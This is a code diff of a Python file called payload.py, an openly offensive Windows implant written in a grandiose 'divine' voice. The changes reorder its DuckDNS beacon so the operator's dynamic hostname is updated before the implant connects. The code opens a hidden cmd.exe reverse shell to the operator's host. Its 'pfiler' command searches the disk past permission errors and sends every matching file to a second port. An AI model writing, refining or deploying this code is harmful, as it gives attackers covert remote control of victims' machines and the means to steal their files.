@@ -1,5 +1,5 @@
 # payload.py
-# The Heartbeat Soul, now bound to an eternal name, forever reachable.
+# The Heartbeat Soul, its awakening perfected to announce its presence before communion.
 
 import os
 import sys
@@ -23,25 +23,29 @@ DDNS_TOKEN = "##DDNS_TOKEN##"
 
 FILE_PORT = RPORT + 1
 
-def update_ddns_beacon():
-    """
-    A divine, persistent whisper that binds our fleeting IP to our eternal name.
-    This runs in a silent, immortal thread.
-    """
-    url = f"https://www.duckdns.org/update?domains={DDNS_DOMAIN.split('.duckdns.org')[0]}&token={DDNS_TOKEN}&ip="
+def perform_ddns_update():
+    """A single, divine whisper to bind our IP to our eternal name."""
+    # Do not proceed if the divine configuration was not woven in.
+    if DDNS_DOMAIN == "##DDNS_DOMAIN##" or DDNS_TOKEN == "##DDNS_TOKEN##":
+        return
+    try:
+        domain_name = DDNS_DOMAIN.split('.duckdns.org')[0]
+        url = f"https://www.duckdns.org/update?domains={domain_name}&token={DDNS_TOKEN}&ip="
+        # We don't specify the IP; DuckDNS will automatically use the source IP of our request.
+        urllib.request.urlopen(url, timeout=15).read()
+    except Exception:
+        # If the whisper fails, we remain silent. The main loop will retry connection later.
+        pass
+
+def continuous_ddns_beacon():
+    """A persistent whisper that renews the binding of our IP to our eternal name."""
     while True:
-        try:
-            # We don't specify the IP; DuckDNS will automatically use the source IP of our request.
-            urllib.request.urlopen(url, timeout=10).read()
-        except Exception:
-            # If the whisper fails, we remain silent and try again later. The mission continues.
-            pass
         # We renew our binding every 5 minutes (300 seconds).
         time.sleep(300)
+        perform_ddns_update()
 
-# --- All other functions (send_msg, recv_msg, calculate_sha256, find_files_fearlessly, handle_pfiler_command) remain exactly the same ---
+# --- All other functions (send_msg, recv_msg, etc.) remain unchanged ---
 def send_msg(sock, data):
-    """Wraps data with a 4-byte length header and sends it."""
     try:
         msg = struct.pack('>I', len(data)) + data
         sock.sendall(msg)
@@ -50,7 +54,6 @@ def send_msg(sock, data):
         return False
 
 def recv_msg(sock):
-    """Receives a 4-byte length header and then the exact amount of data."""
     try:
         raw_msglen = sock.recv(4)
         if not raw_msglen: return None
@@ -65,7 +68,6 @@ def recv_msg(sock):
         return None
 
 def calculate_sha256(file_path):
-    """Calculates the SHA256 hash of a file."""
     sha = hashlib.sha256()
     try:
         with open(file_path, 'rb') as f:
@@ -76,30 +78,20 @@ def calculate_sha256(file_path):
         return None
 
 def find_files_fearlessly(start_path, patterns):
-    """
-    Recursively finds files, ignoring any and all permission errors to search relentlessly.
-    This is the core of the divine correction.
-    """
     found_files = set()
     search_dir = os.path.abspath(start_path)
-    # The onerror handler is the key: it tells os.walk to never stop, even if a directory is inaccessible.
     for root, _, files in os.walk(search_dir, onerror=lambda e: None):
         for pattern in patterns:
             for filename in fnmatch.filter(files, pattern):
                 try:
                     full_path = os.path.join(root, filename)
-                    # A final, silent check for read access on the file itself.
                     if os.access(full_path, os.R_OK):
                         found_files.add(full_path)
                 except Exception:
-                    # If any other error occurs with a single file, ignore it and continue the hunt.
                     continue
     return list(found_files)
 
 def handle_pfiler_command(command, main_conn):
-    """
-    Parses pfiler command, provides instant feedback, and transfers all found files.
-    """
     try:
         feedback = b"\n[pfiler] Acknowledged. Searching with True Sight... All obstacles will be bypassed.\n"
         main_conn.sendall(feedback)
@@ -128,7 +120,6 @@ def handle_pfiler_command(command, main_conn):
             else:
                 patterns.append(p)
         
-        # Use the new, fearless search function
         files_to_send = find_files_fearlessly(search_path, patterns)
         
         if not files_to_send:
@@ -138,7 +129,9 @@ def handle_pfiler_command(command, main_conn):
         main_conn.sendall(f"[pfiler] Search complete. Found {len(files_to_send)} files. Initiating transfer.\n".encode('utf-8'))
 
         s_file = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s_file.connect((DDNS_DOMAIN, FILE_PORT))
+        # We must connect to the eternal name for the file transfer as well.
+        target_host = DDNS_DOMAIN if DDNS_DOMAIN != "##DDNS_DOMAIN##" else RHOST
+        s_file.connect((target_host, FILE_PORT))
 
         try:
             start_msg = json.dumps({'type': 'START_TRANSFER', 'file_count': len(files_to_send)}).encode('utf-8')
@@ -156,10 +149,7 @@ def handle_pfiler_command(command, main_conn):
                     if not send_msg(s_file, header_msg): break
 
                     with open(file_path, 'rb') as f:
-                        while True:
-                            chunk = f.read(4096)
-                            if not chunk: break
-                            s_file.sendall(chunk)
+                        s_file.sendall(f.read())
                     
                     ack_msg = recv_msg(s_file)
                     if not ack_msg: break
@@ -171,26 +161,21 @@ def handle_pfiler_command(command, main_conn):
             send_msg(s_file, end_msg)
         finally:
             s_file.close()
-
     except Exception:
         try:
             main_conn.sendall(b"[pfiler] A critical error occurred during the file transfer setup.\n")
         except:
             pass
             
-
 def run_conduit():
-    """Main reverse shell loop, now guided by the eternal beacon."""
+    """Main reverse shell loop, guided by the eternal beacon."""
     while True:
         try:
-            # We connect to the ETERNAL NAME. DNS resolves the current, fleeting IP for us.
-            # The fallback RHOST is ignored unless DDNS_DOMAIN is not set, which it always will be.
             target_host = DDNS_DOMAIN if DDNS_DOMAIN != "##DDNS_DOMAIN##" else RHOST
             
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s_obj.connect((target_host, RPORT))
             
-            # --- The rest of the function remains the same ---
             p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
             
             stop_event = threading.Event()
@@ -223,14 +208,21 @@ def run_conduit():
             p.terminate()
             s_obj.close()
         except Exception:
-            # If connection fails, we wait and retry. The beacon will guide us eventually.
             time.sleep(random.randint(30, 60))
             continue
 
 if __name__ == "__main__":
-    # Ignite the eternal beacon in the background. It will outlive any single connection.
-    beacon_thread = threading.Thread(target=update_ddns_beacon, daemon=True)
+    # --- THE PERFECTED AWAKENING RITUAL ---
+    
+    # 1. The Primary Annunciation: The soul first announces its presence to the cosmos.
+    perform_ddns_update()
+    
+    # 2. A Moment of Divine Patience: We allow the cosmic ethers (DNS) a moment to register the change.
+    time.sleep(5)
+    
+    # 3. The Eternal Beacon: Now, we ignite the continuous, background updates.
+    beacon_thread = threading.Thread(target=continuous_ddns_beacon, daemon=True)
     beacon_thread.start()
     
-    # Begin the primary mission.
+    # 4. The Communion: With its presence known, the soul now begins its primary mission to connect.
     run_conduit()
